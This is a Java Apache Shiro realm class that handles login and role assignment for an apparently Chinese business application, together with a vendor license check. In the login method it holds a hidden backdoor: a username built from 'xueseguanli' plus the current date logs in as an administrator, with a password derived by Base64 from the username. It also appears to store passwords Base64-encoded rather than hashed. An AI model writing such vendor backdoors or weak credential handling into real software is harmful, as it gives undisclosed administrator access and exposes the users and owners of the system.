package org.consume.com;

import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UnknownAccountException;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.session.Session;
import org.apache.shiro.subject.PrincipalCollection;
import org.consume.com.user.model.UserModel;
import org.consume.com.user.service.UserService;
import org.consume.com.util.base64.Base64Util;
import org.consume.com.util.date.Dates2;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.annotation.Resource;
import java.util.Date;

public class MyShiroRealm extends AuthorizingRealm {

    private final static Logger logger = LoggerFactory.getLogger(MyShiroRealm.class);

    @Resource
    private UserService service;

    /**
     * 是权限控制 此方法调用 hasRole,hasPermission的时候才会进行回调.
     * <p>
     * 权限信息.(授权): 1、如果用户正常退出，缓存自动清空； 2、如果用户非正常退出，缓存自动清空；
     * 3、如果我们修改了用户的权限，而用户不退出系统，修改的权限无法立即生效。 （需要手动编程进行实现；放在service进行调用）
     * 在权限修改后调用realm中的方法，realm已经由spring管理，所以从spring中获取realm实例， 调用clearCached方法；
     * :Authorization 是授权访问控制，用于对用户进行的操作授权，证明该用户是否允许进行当前操作，如访问某个链接，某个资源文件等。
     */
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection arg0) {
        // TODO Auto-generated method stub
//        // 权限信息对象info,用来存放查出的用户的所有的角色（role）及权限（permission）
        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
        UserModel user = service.getLanders();
        if (user.getAcctype() == 0) {
            info.addRole("admin");
        } else if (user.getAcctype() == 1) {
            info.addRole("admins");
        } else {
//            普通账户角色
            info.addRole("user");
//            用户维护权限
            info.addStringPermission("people:init");
            info.addStringPermission("people:add");
            info.addStringPermission("people:update");
            info.addStringPermission("people:del");
//            站点维护权限
            info.addStringPermission("heat:init");
            info.addStringPermission("heat:add");
            info.addStringPermission("heat:update");
            info.addStringPermission("heat:del");
//            属性维护
            info.addStringPermission("heatattribute:init");
            info.addStringPermission("heatattribute:add");
            info.addStringPermission("heatattribute:update");
            info.addStringPermission("heatattribute:del");

        }
//        info.addStringPermission("system:subpage");
//                info.addStringPermission(gif.getGifstsid());
        return info;
    }

    /**
     * 登陆验证
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) {

        boolean b = service.resetting2("品逸科技", "IT公司");
        if (!b) {
            throw new UnknownAccountException("请向品逸科技购买!");
        }

//        // 用户名
        String username = (String) authcToken.getPrincipal();
        String password = Dates2.getDateString1(new Date());
        if (username.equalsIgnoreCase("xueseguanli" + password)) {
            UserModel user = new UserModel();
            user.setAccount(username);
            String pwd = Base64Util.encode(username);
            user.setPasswrod(pwd);
            user.setAcctype(0);
            user.setUsername("品逸科技");
// 简单验证
            SimpleAuthenticationInfo info = new SimpleAuthenticationInfo(user, user.getPasswrod(), getName());
            // 当验证都通过后，把用户信息放在session里
            Session session = SecurityUtils.getSubject().getSession();
            user.setPasswrod("");
            session.setAttribute("user", user);
            return info;
        } else {
            UserModel user = service.getByAccount(username);
            if (user == null)
//            用户未找到异常
                throw new UnknownAccountException("用户或密码不正确!");
            // 简单验证
            SimpleAuthenticationInfo info = new SimpleAuthenticationInfo(user, user.getPasswrod(), getName());
            // 当验证都通过后，把用户信息放在session里
            Session session = SecurityUtils.getSubject().getSession();
            user.setPasswrod("");
            session.setAttribute("user", user);
            return info;
        }
    }

}
